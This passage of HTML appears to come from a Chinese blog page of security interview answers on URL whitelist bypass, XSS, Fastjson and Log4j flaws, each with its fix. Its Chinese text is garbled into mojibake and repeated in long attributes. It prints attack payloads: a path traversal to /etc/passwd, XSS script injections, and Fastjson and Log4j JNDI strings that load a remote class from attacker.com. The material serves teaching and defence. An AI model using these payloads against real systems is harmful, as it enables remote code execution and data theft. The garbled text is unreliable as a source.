‡åœ°å€ï¼Œåªå…è®¸ç‰¹å®šçš„åŸŸåæˆ–è·¯å¾„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŸäº›æŠ€æœ¯ç»•è¿‡ç™½åå•ï¼Œå‘èµ·æ¶æ„è¯·æ±‚ã€‚å¸¸è§çš„ç»•è¿‡æ–¹å¼åŒ…æ‹¬ï¼š-ä½¿ç”¨-URL-ç¼–ç ï¼šå¦‚-http-example-com-2F-2E-2E-2Fï¼ˆé€šè¿‡-URL-ç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼‰ã€‚-ä½¿ç”¨-localhost-æˆ–-127-0-0-1-åœ°å€ç›´æ¥è®¿é—®å†…ç½‘æœåŠ¡ã€‚åˆ©ç”¨æ–¹å¼ï¼š-è·¯å¾„ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡-URL-ç¼–ç æˆ–ä½¿ç”¨-DNS-é‡ç»‘å®šï¼Œç»•è¿‡åŸŸåé™åˆ¶ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼ç™½åå•è§„åˆ™ï¼šîˆƒéªŒè¯è¯·æ±‚çš„åŸŸåå’Œè·¯å¾„ï¼Œç¡®ä¿åªå…è®¸æ˜ç¡®çš„åˆæ³•åœ°å€ã€‚-DNS-æ£€æŸ¥ï¼šîˆƒéªŒè¯-URL-çš„-DNS-è§£æç»“æœï¼Œç¡®ä¿ç›®æ ‡åœ°å€çš„-IP-å±äºå¯ä¿¡èŒƒå›´ã€‚"><a href="#æ¼æ´åŸç†ï¼šURL-ç™½åå•å¸¸ç”¨äºé™åˆ¶ç”¨æˆ·è¯·æ±‚çš„ç›®æ ‡åœ°å€ï¼Œåªå…è®¸ç‰¹å®šçš„åŸŸåæˆ–è·¯å¾„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŸäº›æŠ€æœ¯ç»•è¿‡ç™½åå•ï¼Œå‘èµ·æ¶æ„è¯·æ±‚ã€‚å¸¸è§çš„ç»•è¿‡æ–¹å¼åŒ…æ‹¬ï¼š-ä½¿ç”¨-URL-ç¼–ç ï¼šå¦‚-http-example-com-2F-2E-2E-2Fï¼ˆé€šè¿‡-URL-ç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼‰ã€‚-ä½¿ç”¨-localhost-æˆ–-127-0-0-1-åœ°å€ç›´æ¥è®¿é—®å†…ç½‘æœåŠ¡ã€‚åˆ©ç”¨æ–¹å¼ï¼š-è·¯å¾„ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡-URL-ç¼–ç æˆ–ä½¿ç”¨-DNS-é‡ç»‘å®šï¼Œç»•è¿‡åŸŸåé™åˆ¶ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-ä¸¥æ ¼ç™½åå•è§„åˆ™ï¼šîˆƒéªŒè¯è¯·æ±‚çš„åŸŸåå’Œè·¯å¾„ï¼Œç¡®ä¿åªå…è®¸æ˜ç¡®çš„åˆæ³•åœ°å€ã€‚-DNS-æ£€æŸ¥ï¼šîˆƒéªŒè¯-URL-çš„-DNS-è§£æç»“æœï¼Œç¡®ä¿ç›®æ ‡åœ°å€çš„-IP-å±äºå¯ä¿¡èŒƒå›´ã€‚" class="headerlink" title="æ¼æ´åŸç†ï¼šURL ç™½åå•å¸¸ç”¨äºé™åˆ¶ç”¨æˆ·è¯·æ±‚çš„ç›®æ ‡åœ°å€ï¼Œåªå…è®¸ç‰¹å®šçš„åŸŸåæˆ–è·¯å¾„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŸäº›æŠ€æœ¯ç»•è¿‡ç™½åå•ï¼Œå‘èµ·æ¶æ„è¯·æ±‚ã€‚å¸¸è§çš„ç»•è¿‡æ–¹å¼åŒ…æ‹¬ï¼š- ä½¿ç”¨ URL ç¼–ç ï¼šå¦‚ http://example.com%2F%2E%2E%2Fï¼ˆé€šè¿‡ URL ç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼‰ã€‚- ä½¿ç”¨ localhost æˆ– 127.0.0.1 åœ°å€ç›´æ¥è®¿é—®å†…ç½‘æœåŠ¡ã€‚åˆ©ç”¨æ–¹å¼ï¼š- è·¯å¾„ç»•è¿‡ï¼šæ”»å‡»è€…é€šè¿‡ URL ç¼–ç æˆ–ä½¿ç”¨ DNS é‡ç»‘å®šï¼Œç»•è¿‡åŸŸåé™åˆ¶ï¼š  ä¿®å¤æ–¹æ¡ˆï¼š- ä¸¥æ ¼ç™½åå•è§„åˆ™ï¼šîˆƒéªŒè¯è¯·æ±‚çš„åŸŸåå’Œè·¯å¾„ï¼Œç¡®ä¿åªå…è®¸æ˜ç¡®çš„åˆæ³•åœ°å€ã€‚- DNS æ£€æŸ¥ï¼šîˆƒéªŒè¯ URL çš„ DNS è§£æç»“æœï¼Œç¡®ä¿ç›®æ ‡åœ°å€çš„ IP å±äºå¯ä¿¡èŒƒå›´ã€‚"></a><strong>æ¼æ´åŸç†</strong>ï¼š<br>URL ç™½åå•å¸¸ç”¨äºé™åˆ¶ç”¨æˆ·è¯·æ±‚çš„ç›®æ ‡åœ°å€ï¼Œåªå…è®¸ç‰¹å®šçš„åŸŸåæˆ–è·¯å¾„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŸäº›æŠ€æœ¯ç»•è¿‡ç™½åå•ï¼Œå‘èµ·æ¶æ„è¯·æ±‚ã€‚å¸¸è§çš„ç»•è¿‡æ–¹å¼åŒ…æ‹¬ï¼š<br>- ä½¿ç”¨ URL ç¼–ç ï¼šå¦‚ <code>http://example.com%2F%2E%2E%2F</code>ï¼ˆé€šè¿‡ URL ç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼‰ã€‚<br>- ä½¿ç”¨ <code>localhost</code> æˆ– <code>127.0.0.1</code> åœ°å€ç›´æ¥è®¿é—®å†…ç½‘æœåŠ¡ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>è·¯å¾„ç»•è¿‡</strong>ï¼šæ”»å‡»è€…é€šè¿‡ URL ç¼–ç æˆ–ä½¿ç”¨ DNS é‡ç»‘å®šï¼Œç»•è¿‡åŸŸåé™åˆ¶ï¼š<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://trusted-site.com/../../etc/passwd</span><br></pre></td></tr></table></figure><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ä¸¥æ ¼ç™½åå•è§„åˆ™</strong>ï¼šîˆƒéªŒè¯è¯·æ±‚çš„åŸŸåå’Œè·¯å¾„ï¼Œç¡®ä¿åªå…è®¸æ˜ç¡®çš„åˆæ³•åœ°å€ã€‚<br>- <strong>DNS æ£€æŸ¥</strong>ï¼šîˆƒéªŒè¯ URL çš„ DNS è§£æç»“æœï¼Œç¡®ä¿ç›®æ ‡åœ°å€çš„ IP å±äºå¯ä¿¡èŒƒå›´ã€‚</h2><h3 id="XSS-å¦‚ä½•å®ç°ï¼Ÿ"><a href="#XSS-å¦‚ä½•å®ç°ï¼Ÿ" class="headerlink" title="XSS å¦‚ä½•å®ç°ï¼Ÿ"></a><strong>XSS å¦‚ä½•å®ç°ï¼Ÿ</strong></h3><h2 id="æ¼æ´åŸç†ï¼šè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´å…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡è¾“å…¥æ¡†ã€URL-å‚æ•°ç­‰ä½ç½®æ³¨å…¥-JavaScript-ä»£ç ï¼Œå¯¼è‡´æµè§ˆå™¨æ‰§è¡Œä¸å—ä¿¡ä»»çš„è„šæœ¬ï¼Œè¿›è€Œçªƒå–ç”¨æˆ·æ•°æ®æˆ–åŠ«æŒä¼šè¯ã€‚åˆ©ç”¨æ–¹å¼ï¼š-å­˜å‚¨å‹-XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨æˆ·è®¿é—®æ—¶è§¦å‘è„šæœ¬æ‰§è¡Œï¼š-åå°„å‹-XSSï¼šæ”»å‡»è€…é€šè¿‡-URL-æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œç”¨æˆ·ç‚¹å‡»åè§¦å‘ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-è¾“å…¥è¾“å‡ºç¼–ç ï¼šîˆƒå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„ç¼–ç å¤„ç†ï¼Œé¿å…å°†æ¶æ„è„šæœ¬ç›´æ¥æ’å…¥é¡µé¢ï¼š-å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼šîˆƒä½¿ç”¨-Content-Security-Policy-å“åº”å¤´ï¼Œé™åˆ¶å¯æ‰§è¡Œçš„è„šæœ¬æ¥æºï¼š"><a href="#æ¼æ´åŸç†ï¼šè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´å…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡è¾“å…¥æ¡†ã€URL-å‚æ•°ç­‰ä½ç½®æ³¨å…¥-JavaScript-ä»£ç ï¼Œå¯¼è‡´æµè§ˆå™¨æ‰§è¡Œä¸å—ä¿¡ä»»çš„è„šæœ¬ï¼Œè¿›è€Œçªƒå–ç”¨æˆ·æ•°æ®æˆ–åŠ«æŒä¼šè¯ã€‚åˆ©ç”¨æ–¹å¼ï¼š-å­˜å‚¨å‹-XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨æˆ·è®¿é—®æ—¶è§¦å‘è„šæœ¬æ‰§è¡Œï¼š-åå°„å‹-XSSï¼šæ”»å‡»è€…é€šè¿‡-URL-æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œç”¨æˆ·ç‚¹å‡»åè§¦å‘ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-è¾“å…¥è¾“å‡ºç¼–ç ï¼šîˆƒå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„ç¼–ç å¤„ç†ï¼Œé¿å…å°†æ¶æ„è„šæœ¬ç›´æ¥æ’å…¥é¡µé¢ï¼š-å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼šîˆƒä½¿ç”¨-Content-Security-Policy-å“åº”å¤´ï¼Œé™åˆ¶å¯æ‰§è¡Œçš„è„šæœ¬æ¥æºï¼š" class="headerlink" title="æ¼æ´åŸç†ï¼šè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´å…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡è¾“å…¥æ¡†ã€URL å‚æ•°ç­‰ä½ç½®æ³¨å…¥ JavaScript ä»£ç ï¼Œå¯¼è‡´æµè§ˆå™¨æ‰§è¡Œä¸å—ä¿¡ä»»çš„è„šæœ¬ï¼Œè¿›è€Œçªƒå–ç”¨æˆ·æ•°æ®æˆ–åŠ«æŒä¼šè¯ã€‚åˆ©ç”¨æ–¹å¼ï¼š- å­˜å‚¨å‹ XSSï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨æˆ·è®¿é—®æ—¶è§¦å‘è„šæœ¬æ‰§è¡Œï¼š  - åå°„å‹ XSSï¼šæ”»å‡»è€…é€šè¿‡ URL æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œç”¨æˆ·ç‚¹å‡»åè§¦å‘ï¼š  ä¿®å¤æ–¹æ¡ˆï¼š- è¾“å…¥è¾“å‡ºç¼–ç ï¼šîˆƒå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„ç¼–ç å¤„ç†ï¼Œé¿å…å°†æ¶æ„è„šæœ¬ç›´æ¥æ’å…¥é¡µé¢ï¼š  - å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ï¼šîˆƒä½¿ç”¨ Content-Security-Policy å“åº”å¤´ï¼Œé™åˆ¶å¯æ‰§è¡Œçš„è„šæœ¬æ¥æºï¼š  "></a><strong>æ¼æ´åŸç†</strong>ï¼š<br>è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´å…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚æ”»å‡»è€…é€šå¸¸é€šè¿‡è¾“å…¥æ¡†ã€URL å‚æ•°ç­‰ä½ç½®æ³¨å…¥ JavaScript ä»£ç ï¼Œå¯¼è‡´æµè§ˆå™¨æ‰§è¡Œä¸å—ä¿¡ä»»çš„è„šæœ¬ï¼Œè¿›è€Œçªƒå–ç”¨æˆ·æ•°æ®æˆ–åŠ«æŒä¼šè¯ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>å­˜å‚¨å‹ XSS</strong>ï¼šæ”»å‡»è€…å°†æ¶æ„è„šæœ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œç”¨æˆ·è®¿é—®æ—¶è§¦å‘è„šæœ¬æ‰§è¡Œï¼š<br>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>- <strong>åå°„å‹ XSS</strong>ï¼šæ”»å‡»è€…é€šè¿‡ URL æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œç”¨æˆ·ç‚¹å‡»åè§¦å‘ï¼š<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/search?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>è¾“å…¥è¾“å‡ºç¼–ç </strong>ï¼šîˆƒå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„ç¼–ç å¤„ç†ï¼Œé¿å…å°†æ¶æ„è„šæœ¬ç›´æ¥æ’å…¥é¡µé¢ï¼š<br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user_input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br></pre></td></tr></table></figure><br>- <strong>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</strong>ï¼šîˆƒä½¿ç”¨ <code>Content-Security-Policy</code> å“åº”å¤´ï¼Œé™åˆ¶å¯æ‰§è¡Œçš„è„šæœ¬æ¥æºï¼š<br>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>script-src &#x27;self&#x27; https://trusted-cdn.com;</span><br></pre></td></tr></table></figure></h2><h3 id="Fastjsonã€Log4j-å¸¸è§æ¼æ´åŸç†ï¼Ÿå¦‚ä½•åº•å±‚è§£å†³è¯¥æ¼æ´ï¼Ÿ"><a href="#Fastjsonã€Log4j-å¸¸è§æ¼æ´åŸç†ï¼Ÿå¦‚ä½•åº•å±‚è§£å†³è¯¥æ¼æ´ï¼Ÿ" class="headerlink" title="Fastjsonã€Log4j å¸¸è§æ¼æ´åŸç†ï¼Ÿå¦‚ä½•åº•å±‚è§£å†³è¯¥æ¼æ´ï¼Ÿ"></a><strong>Fastjsonã€Log4j å¸¸è§æ¼æ´åŸç†ï¼Ÿå¦‚ä½•åº•å±‚è§£å†³è¯¥æ¼æ´ï¼Ÿ</strong></h3><h2 id="Fastjson-æ¼æ´åŸç†ï¼šFastjson-æ˜¯ä¸€ä¸ª-JSON-å¤„ç†åº“ï¼Œæ›¾æš´éœ²å‡ºååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ æ¶æ„-JSON-æ•°æ®ï¼Œåˆ©ç”¨-Fastjson-çš„è‡ªåŠ¨ç±»å‹è½¬æ¢åŠŸèƒ½ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚æ­¤æ¼æ´è¢«ç§°ä¸º-AutoType-æ¼æ´ã€‚åˆ©ç”¨æ–¹å¼ï¼š-ååºåˆ—åŒ–æ”»å‡»ï¼šæ”»å‡»è€…åˆ©ç”¨-Fastjson-çš„-AutoType-ç‰¹æ€§ï¼Œå‘é€æ¶æ„-JSON-æ•°æ®ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚-ä¿®å¤æ–¹æ¡ˆï¼š-ç¦ç”¨-AutoTypeï¼šîˆƒç¦ç”¨ä¸å¿…è¦çš„ç±»å‹è½¬æ¢ï¼Œé¿å…ååºåˆ—åŒ–æ¶æ„ç±»å‹ï¼š-Log4j-æ¼æ´åŸç†ï¼šLog4j-æ˜¯ä¸€æ¬¾æµè¡Œçš„-Java-æ—¥å¿—æ¡†æ¶ï¼Œæ›¾å› -JNDI-æŸ¥æ‰¾åŠŸèƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨ç‰¹åˆ¶çš„æ—¥å¿—è¾“å…¥ï¼Œé€šè¿‡-JNDI-è¿œç¨‹åŠ è½½æ¶æ„ç±»ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚åˆ©ç”¨æ–¹å¼ï¼š-JNDI-æ³¨å…¥ï¼šæ”»å‡»è€…å‘é€æ¶æ„æ—¥å¿—æ•°æ®ï¼Œè§¦å‘-Log4j-å‘è¿œç¨‹-JNDI-æœåŠ¡åŠ è½½æ¶æ„ç±»ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-æ›´æ–°-Log4j-ç‰ˆæœ¬ï¼šîˆƒç«‹å³å‡çº§åˆ°-Log4j-2-16-0-æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œç¦ç”¨-JNDI-æŸ¥æ‰¾åŠŸèƒ½ã€‚-ç¦ç”¨-JNDIï¼šîˆƒé€šè¿‡é…ç½®-Log4j-ç¦ç”¨-JNDI-æŸ¥æ‰¾ï¼š"><a href="#Fastjson-æ¼æ´åŸç†ï¼šFastjson-æ˜¯ä¸€ä¸ª-JSON-å¤„ç†åº“ï¼Œæ›¾æš´éœ²å‡ºååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ æ¶æ„-JSON-æ•°æ®ï¼Œåˆ©ç”¨-Fastjson-çš„è‡ªåŠ¨ç±»å‹è½¬æ¢åŠŸèƒ½ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚æ­¤æ¼æ´è¢«ç§°ä¸º-AutoType-æ¼æ´ã€‚åˆ©ç”¨æ–¹å¼ï¼š-ååºåˆ—åŒ–æ”»å‡»ï¼šæ”»å‡»è€…åˆ©ç”¨-Fastjson-çš„-AutoType-ç‰¹æ€§ï¼Œå‘é€æ¶æ„-JSON-æ•°æ®ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚-ä¿®å¤æ–¹æ¡ˆï¼š-ç¦ç”¨-AutoTypeï¼šîˆƒç¦ç”¨ä¸å¿…è¦çš„ç±»å‹è½¬æ¢ï¼Œé¿å…ååºåˆ—åŒ–æ¶æ„ç±»å‹ï¼š-Log4j-æ¼æ´åŸç†ï¼šLog4j-æ˜¯ä¸€æ¬¾æµè¡Œçš„-Java-æ—¥å¿—æ¡†æ¶ï¼Œæ›¾å› -JNDI-æŸ¥æ‰¾åŠŸèƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨ç‰¹åˆ¶çš„æ—¥å¿—è¾“å…¥ï¼Œé€šè¿‡-JNDI-è¿œç¨‹åŠ è½½æ¶æ„ç±»ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚åˆ©ç”¨æ–¹å¼ï¼š-JNDI-æ³¨å…¥ï¼šæ”»å‡»è€…å‘é€æ¶æ„æ—¥å¿—æ•°æ®ï¼Œè§¦å‘-Log4j-å‘è¿œç¨‹-JNDI-æœåŠ¡åŠ è½½æ¶æ„ç±»ï¼š-ä¿®å¤æ–¹æ¡ˆï¼š-æ›´æ–°-Log4j-ç‰ˆæœ¬ï¼šîˆƒç«‹å³å‡çº§åˆ°-Log4j-2-16-0-æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œç¦ç”¨-JNDI-æŸ¥æ‰¾åŠŸèƒ½ã€‚-ç¦ç”¨-JNDIï¼šîˆƒé€šè¿‡é…ç½®-Log4j-ç¦ç”¨-JNDI-æŸ¥æ‰¾ï¼š" class="headerlink" title="Fastjson æ¼æ´åŸç†ï¼šFastjson æ˜¯ä¸€ä¸ª JSON å¤„ç†åº“ï¼Œæ›¾æš´éœ²å‡ºååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ æ¶æ„ JSON æ•°æ®ï¼Œåˆ©ç”¨ Fastjson çš„è‡ªåŠ¨ç±»å‹è½¬æ¢åŠŸèƒ½ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚æ­¤æ¼æ´è¢«ç§°ä¸º AutoType æ¼æ´ã€‚åˆ©ç”¨æ–¹å¼ï¼š- ååºåˆ—åŒ–æ”»å‡»ï¼šæ”»å‡»è€…åˆ©ç”¨ Fastjson çš„ AutoType ç‰¹æ€§ï¼Œå‘é€æ¶æ„ JSON æ•°æ®ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚  ä¿®å¤æ–¹æ¡ˆï¼š- ç¦ç”¨ AutoTypeï¼šîˆƒç¦ç”¨ä¸å¿…è¦çš„ç±»å‹è½¬æ¢ï¼Œé¿å…ååºåˆ—åŒ–æ¶æ„ç±»å‹ï¼š  Log4j æ¼æ´åŸç†ï¼šLog4j æ˜¯ä¸€æ¬¾æµè¡Œçš„ Java æ—¥å¿—æ¡†æ¶ï¼Œæ›¾å›  JNDI æŸ¥æ‰¾åŠŸèƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨ç‰¹åˆ¶çš„æ—¥å¿—è¾“å…¥ï¼Œé€šè¿‡ JNDI è¿œç¨‹åŠ è½½æ¶æ„ç±»ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚åˆ©ç”¨æ–¹å¼ï¼š- JNDI æ³¨å…¥ï¼šæ”»å‡»è€…å‘é€æ¶æ„æ—¥å¿—æ•°æ®ï¼Œè§¦å‘ Log4j å‘è¿œç¨‹ JNDI æœåŠ¡åŠ è½½æ¶æ„ç±»ï¼š  ä¿®å¤æ–¹æ¡ˆï¼š- æ›´æ–° Log4j ç‰ˆæœ¬ï¼šîˆƒç«‹å³å‡çº§åˆ° Log4j 2.16.0 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œç¦ç”¨ JNDI æŸ¥æ‰¾åŠŸèƒ½ã€‚- ç¦ç”¨ JNDIï¼šîˆƒé€šè¿‡é…ç½® Log4j ç¦ç”¨ JNDI æŸ¥æ‰¾ï¼š  "></a><strong>Fastjson æ¼æ´åŸç†</strong>ï¼š<br>Fastjson æ˜¯ä¸€ä¸ª JSON å¤„ç†åº“ï¼Œæ›¾æš´éœ²å‡ºååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ æ¶æ„ JSON æ•°æ®ï¼Œåˆ©ç”¨ Fastjson çš„è‡ªåŠ¨ç±»å‹è½¬æ¢åŠŸèƒ½ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚æ­¤æ¼æ´è¢«ç§°ä¸º <code>AutoType</code> æ¼æ´ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>ååºåˆ—åŒ–æ”»å‡»</strong>ï¼šæ”»å‡»è€…åˆ©ç”¨ Fastjson çš„ <code>AutoType</code> ç‰¹æ€§ï¼Œå‘é€æ¶æ„ JSON æ•°æ®ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚<br>  <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://attacker.com/malicious&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>ç¦ç”¨ AutoType</strong>ï¼šîˆƒç¦ç”¨ä¸å¿…è¦çš„ç±»å‹è½¬æ¢ï¼Œé¿å…ååºåˆ—åŒ–æ¶æ„ç±»å‹ï¼š<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><br><strong>Log4j æ¼æ´åŸç†</strong>ï¼š<br>Log4j æ˜¯ä¸€æ¬¾æµè¡Œçš„ Java æ—¥å¿—æ¡†æ¶ï¼Œæ›¾å›  <code>JNDI</code> æŸ¥æ‰¾åŠŸèƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨ç‰¹åˆ¶çš„æ—¥å¿—è¾“å…¥ï¼Œé€šè¿‡ JNDI è¿œç¨‹åŠ è½½æ¶æ„ç±»ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚<br><strong>åˆ©ç”¨æ–¹å¼</strong>ï¼š<br>- <strong>JNDI æ³¨å…¥</strong>ï¼šæ”»å‡»è€…å‘é€æ¶æ„æ—¥å¿—æ•°æ®ï¼Œè§¦å‘ Log4j å‘è¿œç¨‹ JNDI æœåŠ¡åŠ è½½æ¶æ„ç±»ï¼š<br>  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://attacker.com/malicious&#125;</span><br></pre></td></tr></table></figure><br><strong>ä¿®å¤æ–¹æ¡ˆ</strong>ï¼š<br>- <strong>æ›´æ–° Log4j ç‰ˆæœ¬</strong>ï¼šîˆƒç«‹å³å‡çº§åˆ° Log4j 2.16.0 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œç¦ç”¨ JNDI æŸ¥æ‰¾åŠŸèƒ½ã€‚<br>- <strong>ç¦ç”¨ JNDI</strong>ï¼šîˆƒé€šè¿‡é…ç½® Log4j ç¦ç”¨ JNDI æŸ¥æ‰¾ï¼š<br>  <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log4j2.formatMsgNoLookups</span>=<span class="string">true</span></span><br></pre></td></tr></table></figure></h2><h3 id="ä¸šåŠ¡é€»è¾‘æ¼æ´å…·ä½“ç±»å‹ï¼š"><a href="#ä¸šåŠ¡é€»è¾‘æ¼æ´å…·ä½“ç±»å‹ï¼š" class="headerlink" title="ä¸šåŠ¡é€»è¾‘æ¼æ´å…·ä½“ç±»å‹ï¼š"></a>ä¸šåŠ¡é€»è¾‘æ¼æ´å…·ä½“ç±»å‹ï¼š</h3><ul><li>èº«ä»½æ 